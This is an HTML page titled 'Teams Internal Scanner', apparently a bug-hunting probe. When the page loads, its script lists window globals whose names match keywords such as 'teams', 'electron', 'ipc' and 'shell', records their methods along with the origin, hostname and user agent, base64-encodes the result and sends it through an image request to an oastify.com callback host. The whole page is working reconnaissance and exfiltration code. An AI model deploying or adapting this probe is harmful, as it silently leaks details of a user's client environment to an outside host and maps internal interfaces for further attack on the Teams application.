<!DOCTYPE html>
<html>
<head>
  <title>Teams Internal Scanner</title>
</head>
<body>
  <h1>Scanning internal Teams objects...</h1>

  <script>
    (async () => {
      const result = {
        origin: location.origin,
        hostname: location.hostname,
        userAgent: navigator.userAgent,
        internalCandidates: {},
        errors: [],
      };

      const suspiciousKeywords = [
        "teams", "proxy", "postMessage", "adapter", "bridge",
        "shell", "core", "remote", "ipc", "electron", "sidecar", "pre", "ms"
      ];

      const keys = Object.keys(window);
      for (const key of keys) {
        try {
          const lower = key.toLowerCase();
          const matches = suspiciousKeywords.some(s => lower.includes(s));

          if (!matches) continue;

          const val = window[key];
          if (val === null) continue;

          if (typeof val === "function") {
            result.internalCandidates[key] = "function";
          } else if (typeof val === "object") {
            const props = Object.getOwnPropertyNames(val).slice(0, 25); // evitar objetos gigantes
            result.internalCandidates[key] = { type: "object", props };

            // Verificar se há funções internas:
            result.internalCandidates[key].methods = props.filter(p => {
              try {
                return typeof val[p] === "function";
              } catch {
                return false;
              }
            });
          }
        } catch (e) {
          result.errors.push({ key, error: String(e) });
        }
      }

      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
      const url = "https://srn3qjhal1a75jhrros70z94qvwmke83.oastify.com/?resposta=" + base64;
      new Image().src = url;
    })();
  </script>
</body>
</html>
